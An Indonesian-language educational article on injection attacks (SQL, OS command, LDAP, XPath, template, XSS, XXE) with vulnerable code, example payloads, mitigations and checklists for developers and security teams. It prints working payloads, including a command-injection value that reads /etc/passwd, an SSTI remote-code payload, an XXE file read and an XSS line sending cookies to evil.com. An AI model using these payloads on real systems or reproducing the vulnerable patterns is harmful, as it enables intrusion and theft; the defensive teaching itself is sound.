---
title: 'Injection Attack: Ancaman Lama yang Masih Berbahaya di Era Modern'
description: 'Panduan mendalam tentang berbagai jenis serangan Injection — SQL, Command, LDAP, XSS, dan lainnya — beserta cara kerja, contoh eksploitasi nyata, dan strategi mitigasi yang wajib diterapkan oleh Developer dan IT Security.'
pubDate: '2026-04-27'
heroImage: '/assets/injection_attack_hero.svg'
tags: ['security', 'owasp', 'injection', 'sql-injection', 'web-security', 'developer', 'appsec']
---

Injection secara konsisten menduduki posisi teratas dalam daftar kerentanan paling kritis versi OWASP Top 10. Bukan tanpa alasan — meskipun konsepnya sudah dikenal luas sejak era awal web development, serangan ini tetap menjadi penyebab utama kebocoran data berskala besar di seluruh dunia. Artikel ini membahas secara mendalam apa itu Injection, bagaimana cara kerjanya, variasinya, dan bagaimana Developer serta tim Security bisa bertahan dari serangan ini.

---

## Apa Itu Injection?

Injection adalah kelas serangan di mana attacker menyisipkan data berbahaya ke dalam sebuah interpreter — baik itu SQL engine, shell OS, LDAP parser, XML processor, maupun template engine — sehingga interpreter tersebut mengeksekusi perintah yang tidak dimaksudkan oleh developer.

Kesamaan mendasar dari semua jenis Injection adalah **batas antara data dan instruksi menjadi kabur**. Ketika aplikasi menggabungkan input pengguna langsung ke dalam query atau perintah tanpa validasi dan sanitasi yang benar, attacker bisa memanipulasi logika eksekusi tersebut.

---

## OWASP dan Posisi Injection

Dalam **OWASP Top 10 2021**, Injection digabung dengan beberapa kategori terkait (termasuk XSS) dan tetap berada di posisi **A03:2021**. Sebelumnya, dalam OWASP 2017, SQL Injection sendiri sudah menjadi ancaman nomor satu secara independen.

Data dari berbagai laporan keamanan menunjukkan bahwa Injection masih ditemukan di sebagian besar aplikasi web yang diuji melalui penetration testing, termasuk aplikasi enterprise yang dibangun dengan standar modern.

---

## Jenis-Jenis Injection

### 1. SQL Injection (SQLi)

SQL Injection adalah yang paling terkenal dan paling sering dieksploitasi. Terjadi ketika input pengguna disisipkan langsung ke dalam query SQL.

**Contoh rentan:**

```python
# Python — BERBAHAYA
username = request.GET['username']
query = "SELECT * FROM users WHERE username = '" + username + "'"
cursor.execute(query)
```

Jika attacker memasukkan nilai:

```
' OR '1'='1
```

Maka query yang terbentuk menjadi:

```sql
SELECT * FROM users WHERE username = '' OR '1'='1'
```

Query ini selalu bernilai `TRUE`, sehingga attacker bisa melewati autentikasi tanpa kredensial yang valid.

**Variasi SQL Injection:**

| Tipe | Cara Kerja |
|---|---|
| **In-band (Error-based)** | Memanfaatkan pesan error database untuk mengekstrak informasi |
| **In-band (Union-based)** | Menggunakan `UNION SELECT` untuk menggabungkan hasil query lain |
| **Blind (Boolean-based)** | Mengamati perbedaan respons aplikasi (TRUE vs FALSE) |
| **Blind (Time-based)** | Menggunakan fungsi delay (`SLEEP`, `WAITFOR DELAY`) untuk inferensi data |
| **Out-of-band** | Mengirim data hasil eksploitasi ke server eksternal via DNS/HTTP |

**Contoh eksploitasi Union-based untuk enumerasi tabel:**

```sql
' UNION SELECT table_name, null FROM information_schema.tables--
```

**Mitigasi SQL Injection:**

```python
# Python — AMAN: Gunakan Parameterized Query
cursor.execute("SELECT * FROM users WHERE username = %s", (username,))

# Java — AMAN: Gunakan PreparedStatement
PreparedStatement stmt = conn.prepareStatement(
    "SELECT * FROM users WHERE username = ?"
);
stmt.setString(1, username);
```

Prinsip utama: **jangan pernah menggabungkan string input pengguna langsung ke dalam query SQL**. Gunakan parameterized queries atau ORM yang menangani escaping secara otomatis.

---

### 2. OS Command Injection

Terjadi ketika aplikasi meneruskan input pengguna ke shell sistem operasi tanpa sanitasi yang memadai.

**Contoh rentan:**

```php
// PHP — BERBAHAYA
$ip = $_GET['ip'];
system("ping -c 4 " . $ip);
```

Jika attacker memasukkan:

```
8.8.8.8; cat /etc/passwd
```

Shell akan mengeksekusi dua perintah sekaligus:

```bash
ping -c 4 8.8.8.8
cat /etc/passwd
```

Operator yang biasa dimanfaatkan attacker:

| Operator | Fungsi |
|---|---|
| `;` | Eksekusi perintah berikutnya tanpa memedulikan hasil sebelumnya |
| `&&` | Eksekusi perintah berikutnya jika perintah pertama sukses |
| `\|\|` | Eksekusi perintah berikutnya jika perintah pertama gagal |
| `` ` ` `` | Substitusi perintah (backtick) |
| `$()` | Substitusi perintah (modern syntax) |
| `\|` | Pipe output ke perintah berikutnya |

**Mitigasi:**

```python
# Python — AMAN: Gunakan subprocess dengan list argument, bukan shell=True
import subprocess
result = subprocess.run(["ping", "-c", "4", ip], capture_output=True, text=True)

# HINDARI:
os.system("ping -c 4 " + ip)          # Rentan
subprocess.run("ping -c 4 " + ip, shell=True)  # Rentan
```

Hindari shell=True bila memungkinkan. Jika memang harus menggunakan shell, whitelist input secara ketat menggunakan regex.

---

### 3. LDAP Injection

LDAP (Lightweight Directory Access Protocol) Injection menargetkan aplikasi yang menggunakan direktori LDAP (seperti Active Directory) untuk autentikasi atau pencarian data.

**Contoh filter LDAP rentan:**

```java
String filter = "(&(uid=" + username + ")(password=" + password + "))";
```

Attacker memasukkan sebagai username:

```
*)(uid=*))(|(uid=*
```

Filter yang terbentuk menjadi:

```
(&(uid=*)(uid=*))(|(uid=*)(password=apapun))
```

Filter ini dapat melewati validasi password dan mengembalikan semua entri pengguna.

**Mitigasi:** Gunakan library LDAP yang mendukung parameterized queries dan escape karakter khusus seperti `*`, `(`, `)`, `\`, `NUL`.

---

### 4. XPath Injection

Mirip dengan SQL Injection, namun menargetkan query XPath yang digunakan untuk mengakses dokumen XML.

**Contoh rentan:**

```java
String query = "//users/user[name/text()='" + username + 
               "' and password/text()='" + password + "']";
```

Dengan memasukkan `' or '1'='1` sebagai username, attacker bisa melewati autentikasi karena kondisi selalu bernilai true.

---

### 5. Template Injection (SSTI)

Server-Side Template Injection terjadi ketika input pengguna disisipkan langsung ke dalam template engine dan dirender oleh server.

**Contoh rentan (Jinja2/Python):**

```python
# Flask — BERBAHAYA
@app.route("/hello")
def hello():
    name = request.args.get('name')
    return render_template_string("Hello " + name + "!")
```

Jika attacker memasukkan:

```
{{7*7}}
```

Dan aplikasi merender hasilnya sebagai `Hello 49!`, maka SSTI terkonfirmasi. Dari sini, attacker bisa eskalasi ke Remote Code Execution (RCE):

```
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
```

**Template engine populer yang rentan jika digunakan salah:**

- Jinja2 (Python/Flask)
- Twig (PHP)
- Freemarker (Java)
- Pebble (Java)
- Velocity (Java)
- Smarty (PHP)

**Mitigasi:** Jangan pernah meneruskan input pengguna langsung ke fungsi seperti `render_template_string()`. Gunakan template statis dan passing variabel melalui context:

```python
# AMAN
return render_template("hello.html", name=name)
```

---

### 6. HTML Injection & Cross-Site Scripting (XSS)

XSS adalah bentuk Injection di mana attacker menyisipkan skrip berbahaya ke dalam konten web yang kemudian dieksekusi di browser pengguna lain.

**Tiga tipe utama XSS:**

**Reflected XSS** — payload ada di URL, langsung direfleksikan ke respons:

```html
<!-- URL: https://example.com/search?q=<script>alert(document.cookie)</script> -->
<p>Hasil pencarian untuk: <script>alert(document.cookie)</script></p>
```

**Stored XSS** — payload disimpan di database dan ditampilkan ke semua pengguna:

```html
<!-- Komentar yang disimpan attacker: -->
<img src="x" onerror="fetch('https://evil.com/steal?c='+document.cookie)">
```

**DOM-based XSS** — payload dieksekusi melalui manipulasi DOM tanpa menyentuh server:

```javascript
// Kode rentan
document.getElementById("output").innerHTML = location.hash.substring(1);
// URL: https://example.com/#<img src=x onerror=alert(1)>
```

**Mitigasi XSS:**

```javascript
// AMAN: Gunakan textContent, bukan innerHTML
element.textContent = userInput;

// AMAN: Escape output di template (contoh Jinja2)
{{ user_input | e }}

// AMAN: Terapkan Content Security Policy (CSP)
// Header HTTP:
Content-Security-Policy: default-src 'self'; script-src 'self'
```

---

### 7. XML Injection & XXE (XML External Entity)

XXE adalah jenis Injection di mana attacker memanfaatkan fitur external entity dalam XML parser untuk membaca file lokal, melakukan SSRF, atau bahkan DoS.

**Contoh payload XXE untuk membaca `/etc/passwd`:**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
  <data>&xxe;</data>
</root>
```

Jika server mengembalikan konten `&xxe;`, attacker berhasil membaca file sensitif dari server.

**Mitigasi:** Nonaktifkan pemrosesan external entity di XML parser:

```java
// Java — Disable XXE
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
```

---

## Prinsip Pertahanan Universal

Terlepas dari jenis Injection yang dihadapi, ada beberapa prinsip pertahanan yang berlaku universal:

### 1. Validasi Input — Whitelist, Bukan Blacklist

Blacklist (memblokir karakter tertentu seperti `'`, `--`, `<`) mudah di-bypass karena attacker selalu bisa menemukan encoding atau variasi yang tidak terdaftar. Whitelist jauh lebih aman:

```python
import re

def validate_username(username):
    # Hanya izinkan alphanumeric dan underscore, 3-20 karakter
    if not re.match(r'^[a-zA-Z0-9_]{3,20}$', username):
        raise ValueError("Format username tidak valid")
    return username
```

### 2. Parameterized Queries / Prepared Statements

Ini adalah pertahanan paling efektif untuk SQLi. Dengan parameterized query, data dan instruksi SQL benar-benar dipisahkan oleh driver database, sehingga tidak ada cara bagi attacker untuk mengubah struktur query.

### 3. Principle of Least Privilege

Akun database atau service account yang digunakan aplikasi harus memiliki hak akses minimal yang diperlukan:

```sql
-- Buat user khusus untuk aplikasi dengan hak terbatas
CREATE USER 'app_user'@'localhost' IDENTIFIED BY 'strong_password';
GRANT SELECT, INSERT, UPDATE ON mydb.users TO 'app_user'@'localhost';
-- JANGAN berikan DROP, CREATE, atau akses ke tabel sistem
```

Jika terjadi SQLi, attacker hanya bisa melakukan apa yang bisa dilakukan oleh akun tersebut — bukan segalanya.

### 4. Output Encoding

Selalu encode output sesuai konteks di mana data akan ditampilkan:

| Konteks Output | Encoding yang Digunakan |
|---|---|
| HTML Body | HTML Entity Encoding (`&`, `<`, `>`, `"`, `'`) |
| HTML Attribute | HTML Attribute Encoding |
| JavaScript | JavaScript String Encoding |
| URL | URL Encoding (percent-encoding) |
| CSS | CSS Hex Encoding |

### 5. Web Application Firewall (WAF)

WAF dapat membantu mendeteksi dan memblokir payload Injection yang diketahui. Namun, WAF adalah lapisan tambahan, bukan pengganti secure coding. Attacker yang canggih sering kali dapat menemukan cara untuk meng-bypass WAF rule.

### 6. Security Testing yang Konsisten

- **SAST (Static Application Security Testing):** Analisis kode sumber secara statis untuk menemukan pola rentan sebelum deployment.
- **DAST (Dynamic Application Security Testing):** Uji aplikasi yang sedang berjalan dengan simulasi serangan (contoh: OWASP ZAP, Burp Suite).
- **Penetration Testing:** Uji keamanan manual oleh tim security atau pihak ketiga secara berkala.

---

## Checklist untuk Developer

Sebelum setiap deployment, pastikan hal-hal berikut sudah terpenuhi:

- [ ] Semua query database menggunakan parameterized query atau ORM
- [ ] Input divalidasi menggunakan whitelist di sisi server
- [ ] Output di-encode sesuai konteks (HTML, JS, URL)
- [ ] External entity processing di XML parser dinonaktifkan
- [ ] Template engine menerima variabel melalui context, bukan string concatenation
- [ ] Perintah sistem menggunakan argument list, bukan shell string
- [ ] Service account database memiliki hak akses minimal
- [ ] Error message tidak mengekspos detail teknis internal ke pengguna
- [ ] Dependency dan library pihak ketiga selalu diperbarui ke versi terbaru
- [ ] Content Security Policy (CSP) dikonfigurasi dengan benar

---

## Checklist untuk IT Security

- [ ] WAF dikonfigurasi dan rule-nya diperbarui secara rutin
- [ ] SAST/DAST diintegrasikan ke dalam CI/CD pipeline
- [ ] Penetration testing dilakukan minimal setahun sekali, atau setiap perubahan arsitektur besar
- [ ] Log aplikasi dimonitor untuk pola anomali (query error berulang, respons tidak biasa)
- [ ] Prosedur incident response untuk kasus Injection sudah terdokumentasi
- [ ] Developer mendapatkan pelatihan secure coding secara berkala

---

## Penutup

Injection adalah bukti bahwa ancaman keamanan yang sudah lama diketahui pun tetap relevan dan berbahaya jika tidak ditangani dengan serius. Tidak ada silver bullet — pertahanan terbaik adalah kombinasi antara **secure coding practices**, **defense in depth**, dan **kultur keamanan** yang ditanamkan sejak awal siklus pengembangan perangkat lunak.

Bagi developer, memahami cara kerja Injection bukan sekadar pengetahuan akademis — ini adalah keterampilan fundamental yang langsung berdampak pada keamanan data pengguna dan reputasi organisasi. Bagi tim security, memahami Injection dari perspektif attacker adalah kunci untuk membangun deteksi dan respons yang efektif.

---

*Referensi: [OWASP Top 10](https://owasp.org/www-project-top-ten/) · [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/) · [PortSwigger Web Security Academy](https://portswigger.net/web-security)*